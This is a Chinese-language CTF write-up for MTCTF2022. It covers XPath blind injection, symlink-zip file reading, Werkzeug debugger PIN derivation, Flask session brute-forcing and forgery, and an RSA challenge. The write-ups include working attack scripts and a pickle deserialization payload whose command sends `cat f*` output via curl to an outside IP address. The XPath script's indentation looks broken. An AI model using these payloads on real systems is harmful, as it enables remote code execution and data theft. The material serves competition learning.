# MTCTF2022


## WEB

### babyjava
xpath注入  

参考：
[XPATH注入学习 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/7791)  

类似于sql注入，通过注入获取节点信息

#### 语法

- “nodename” – 选取nodename的所有子节点
- “/nodename” – 从根节点中选择
- “//nodename” – 从当前节点选择
- “..” – 选择当前节点的父节点
- “child::node()” – 选择当前节点的所有子节点
- "@" -选择属性
- "//user[position()=2] " 选择节点位置
#### 盲注
```bash
' or count(/)=1 and ''='  # 根节点数量
' or count(/*)=1 and ''='  # 根节点下子节点个数
' or string-length(name(/*[1]))=4 and ''='  # 根节点下节点长度
' or substring(name(/*[1]),2,1)='a' and ''='  # 根节点下节点名称，第二个字符是否为a
' or count(/root)=1 and ''='  # root节点下节点个数
' or string-length(name(/root/*[1]))=4 and ''='  # root第一个子节点长度
' or substring(name(//user[position=1]/username[position=2]),2,1)='l' and ''=' 
# 第一个user下第二个username值，第二个字符是否为l
```
#### 节点信息
root  

​	1 len:4 user  

​		2 len:8 username  

​		len:8 username

#### payload
```python
import requests

url = 'http://eci-2zeck6h5lu4hlf0o62vg.cloudeci1.ichunqiu.com:8888/hello'
head = {
	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36",
	"Content-Type": "application/x-www-form-urlencoded"
}
strs = '}_{-abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'

flag = ''

for i in range(1, 100):
    for j in strs:
        payload_1 = { # root 
            "xpath":"' or substring(name(/*[1]), {}, 1)={} and ''='".format(i,j)
        }

        payload_2 = { # user
            "xpath":"'or substring(name(/root/*[1]), {}, 1)={} and ''='".format(i,j)
        }

        payload_3 = { # username
            "xpath":"'or substring(name(/root/user/*[2]), {}, 1)={} and ''='".format(i,j)
        }
        
        payload_4 = { # flag
            "xpath":"' or substring(name(//user/username[2]), {}, 1)={} and ''='".format(i,j)
        }

 r = requests.post(url=url, headers=head, data=payload_4)
 
if "user1" in r.text:
    flag += j
    print(flag)
```
### OnlineUnzip
上传zip，解压显示
#### 软链接任意读取
类似快捷方式，网站后台解压会读取该软链接指向的文件，做到读取任意文件
```bash
# 读根目录
ln -s / .a  
zip --symlinks root.zip .a
```
发现**ffffl111l1a44a4ggg**，读取发现无权限，算pin值
#### PIN值
在flask下，可通过pin启动python交互式调试器
```python
import hashlib
from itertools import chain
probably_public_bits = [
    'ctf'  # flask登录的用户名，/etc/passwd
    'flask.app',  # modname，默认值
    'Flask',  # getattr(app, “name”, app.class.name)，默认值
    '/usr/local/lib/python3.8/site-packages/flask/app.py'  # app.py路径，报错得到
]
private_bits = [
    '95532807882',  # mac地址十进制，/sys/class/net/eth0/address
    '96cec10d3d9307792745ec3b85c8962019b065577048ffd94233375ed305835825f08ca636839a3cf042ee07df0ef676' # 机器id，/etc/machine-id+/proc/self/cgroup
]
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
     else:
         rv = num
print(rv)
```
进入后读取文件
```bash
import os
os.popen('cat /ffffl111l1a44a4ggg').read()
```
### easypickle
python的pickle反序列化
```python
import base64
import pickle
from flask import Flask, session
import os
import random

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(2).hex()

@app.route('/')
def hello_world():
    if not session.get('user'):
        session['user'] = ''.join(random.choices("admin", k=5))
    return 'Hello {}!'.format(session['user'])


@app.route('/admin')
def admin():
    if session.get('user') != "admin":
        return f"<script>alert('Access Denied');window.location.href='/'</script>"
    else:
        try:
            a = base64.b64decode(session.get('ser_data')).replace(b"builtin", b"BuIltIn").replace(b"os", b"Os").replace(b"bytes", b"Bytes")
            if b'R' in a or b'i' in a or b'o' in a or b'b' in a:
                raise pickle.UnpicklingError("R i o b is forbidden")
            pickle.loads(base64.b64decode(session.get('ser_data')))
            return "ok"
        except:
            return "error!"


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8888)
```
#### flask伪造session
flask将session存在客户端，只经过base64编码和秘钥签名
##### 爆破key
生成四位十六进制字典
```bash
crunch 4 4 1234567890"abcdef" >> baopo.txt
```
爆破工具
[https://github.com/Paradoxis/Flask-Unsign](https://github.com/Paradoxis/Flask-Unsign)
```bash
pip install flask-unsign[wordlist]  # 安装
flask-unsign -u --no-literal-eval --wordlist baopo.txt --server [url]  # 字典爆破
```
得到key **bee6**
##### 伪造session
[https://github.com/noraj/flask-session-cookie-manager](https://github.com/noraj/flask-session-cookie-manager)
```bash
python flask_session_cookie_manager3.py enocde -s "bee6" -t "{'user':'admin'}"
```
```
eyJ1c2VyIjoiYWRtaW4ifQ.Yy_huw.1xsjHN3OtwwMCBzwq7ex4gLhilo
```
进入admin
#### pickle反序列化
[从零开始python反序列化攻击：pickle原理解析 & 不用reduce的RCE姿势 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/89132768)  

[蓝帽杯 2022 web/misc writeup - ek1ng's Blog](https://ek1ng.com/LMCTF2022.html#file-session)  

[反弹Shell，看这一篇就够了 - 腾讯云开发者社区-腾讯云 (tencent.com)](https://cloud.tencent.com/developer/article/1818091)  

序列化

```python
import base64
opcode = b'''c__builtin__
map
p0
0(S'curl http://175.178.47.228:9999/?q=`cat f*`'
tp1
0(cos
system
g1
tp2
0g0
g2
\x81p3
0c__builtin__
bytes
p4
(g3
t\x81.'''
print(base64.b64encode(opcode))
```
伪造session
```bash
python3 flask_session_cookie_manager3.py encode -s "d0c0" -t "{'user':'admin','ser_data':'Y19fYnVpbHRpbl9fCm1hcApwMAowKFMnY3VybCBodHRwOi8vMTc1LjE3OC40Ny4yMjg6OTk5OS8/cT1gY2F0IGYqYCcKdHAxCjAoY29zCnN5c3RlbQpnMQp0cDIKMGcwCmcyCoFwMwowY19fYnVpbHRpbl9fCmJ5dGVzCnA0CihnMwp0gS4='}"
```
发送，得到flag
## Crypto
### strange_rsa1
```python
from Crypto.Util.number import *
from sage.all import RealField
from secret import flag1

Bits = 512
p = getPrime(Bits)
q = getPrime(Bits)
n = p * q

gift = RealField(prec=Bits*2)(p) / RealField(prec=Bits*2)(q)
e = 0x10001
m = bytes_to_long(flag1)
c = pow(m, e, n)

output = open('output.txt', 'w')
output.write('n = ' + str(n) + '\n')
output.write('c = ' + str(c) + '\n')
output.write('gift = ' + str(gift) + '\n')
```
output.txt
```bash
n = 108525167048069618588175976867846563247592681279699764935868571805537995466244621039138584734968186962015154069834228913223982840558626369903697856981515674800664445719963249384904839446749699482532818680540192673814671582032905573381188420997231842144989027400106624744146739238687818312012920530048166672413
c = 23970397560482326418544500895982564794681055333385186829686707802322923345863102521635786012870368948010933275558746273559080917607938457905967618777124428711098087525967347923209347190956512520350806766416108324895660243364661936801627882577951784569589707943966009295758316967368650512558923594173887431924
gift = 0.9878713210057139023298389025767652308503013961919282440169053652488565206963320721234736480911437918373201299590078678742136736290349578719187645145615363088975706222696090029443619975380433122746296316430693294386663490221891787292112964989501856435389725149610724585156154688515007983846599924478524442938
```
因为gift = p/q，n = p * q，所以gift * n = p^2  

考虑精度，先将gift去掉小数点，乘积后再舍位

```python
from Crypto.Util.number import *
import gmpy2

n = 108525167048069618588175976867846563247592681279699764935868571805537995466244621039138584734968186962015154069834228913223982840558626369903697856981515674800664445719963249384904839446749699482532818680540192673814671582032905573381188420997231842144989027400106624744146739238687818312012920530048166672413
c = 23970397560482326418544500895982564794681055333385186829686707802322923345863102521635786012870368948010933275558746273559080917607938457905967618777124428711098087525967347923209347190956512520350806766416108324895660243364661936801627882577951784569589707943966009295758316967368650512558923594173887431924
gift = 0.9878713210057139023298389025767652308503013961919282440169053652488565206963320721234736480911437918373201299590078678742136736290349578719187645145615363088975706222696090029443619975380433122746296316430693294386663490221891787292112964989501856435389725149610724585156154688515007983846599924478524442938
g = 9878713210057139023298389025767652308503013961919282440169053652488565206963320721234736480911437918373201299590078678742136736290349578719187645145615363088975706222696090029443619975380433122746296316430693294386663490221891787292112964989501856435389725149610724585156154688515007983846599924478524442938
e = 0x10001

p = gmpy2.iroot(int(str(n*g)[:-307]),2)[0]
q = n//p
fn = (p-1)*(q-1)
d = gmpy2.invert(e,fn)
m = pow(c,d,n)
s = long_to_bytes(m).decode()
print(s)
```

